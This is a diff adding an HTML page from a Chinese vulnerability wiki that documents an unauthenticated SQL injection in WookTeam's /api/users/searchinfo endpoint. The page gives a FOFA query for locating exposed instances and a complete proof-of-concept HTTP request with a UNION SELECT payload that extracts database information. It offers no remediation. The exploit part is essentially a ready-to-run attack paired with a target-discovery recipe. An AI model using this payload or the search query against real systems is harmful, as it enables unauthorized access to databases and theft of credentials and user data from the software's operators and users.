@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/WookTeam%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9A%84%E5%9B%A2%E9%98%9F%E5%9C%A8%E7%BA%BF%E5%8D%8F%E4%BD%9C%E7%B3%BB%E7%BB%9F/WookTeam%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9A%84%E5%9B%A2%E9%98%9F%E5%9C%A8%E7%BA%BF%E5%8D%8F%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3searchinfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>WookTeam轻量级的团队在线协作系统接口searchinfo存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "WookTeam\u8f7b\u91cf\u7ea7\u7684\u56e2\u961f\u5728\u7ebf\u534f\u4f5c\u7cfb\u7edf\u63a5\u53e3searchinfo\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Wordpress/WordPress%20%28User%20Registration%20%26%20Membership%29%20Plugin%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%28CVE-2025-2563%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Wordpress/WordPress%20%28User%20Registration%20%26%20Membership%29%20Plugin%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%28CVE-2025-2563%29/" class="btn btn-xs btn-link">
+        WordPress (User Registration & Membership) Plugin权限提升漏洞(CVE 2025 2563)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../WookTeam/WookTeamsearchinfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../WookTeam/WookTeamsearchinfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        WookTeam searchinfo存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="wookteamsearchinfosql">WookTeam轻量级的团队在线协作系统接口searchinfo存在SQL注入漏洞<a class="headerlink" href="#wookteamsearchinfosql" title="Permanent link">&para;</a></h1>
+<p>WookTeam /api/users/searchinfo 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">title=&quot;Wookteam&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">searchinfo</span><span class="o">?</span><span class="n">where</span><span class="o">[</span><span class="n">username</span><span class="o">]=</span><span class="mi">1</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">29</span><span class="o">+</span><span class="n">UNION</span><span class="o">+</span><span class="n">ALL</span><span class="o">+</span><span class="n">SELECT</span><span class="o">+</span><span class="n">NULL</span><span class="o">%</span><span class="mi">2</span><span class="n">CCONCAT</span><span class="o">%</span><span class="mi">280</span><span class="n">x7e</span><span class="o">%</span><span class="mi">2</span><span class="n">Cuser</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">2</span><span class="n">C0x7e</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">2</span><span class="n">CNULL</span><span class="o">%</span><span class="mi">2</span><span class="n">CNULL</span><span class="o">%</span><span class="mi">2</span><span class="n">CNULL</span><span class="o">%</span><span class="mi">23</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span><span class="w"> </span><span class="n">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="mi">0</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">your</span><span class="o">-</span><span class="n">ip</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">127.0.0.0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+</code></pre></div>
+<p><img alt="image-20240814095848331" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408140959983.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Wordpress/WordPress%20%28User%20Registration%20%26%20Membership%29%20Plugin%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%28CVE-2025-2563%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Wordpress/WordPress%20%28User%20Registration%20%26%20Membership%29%20Plugin%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%28CVE-2025-2563%29/" class="btn btn-xs btn-link">
+        WordPress (User Registration & Membership) Plugin权限提升漏洞(CVE 2025 2563)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../WookTeam/WookTeamsearchinfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../WookTeam/WookTeamsearchinfo%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        WookTeam searchinfo存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
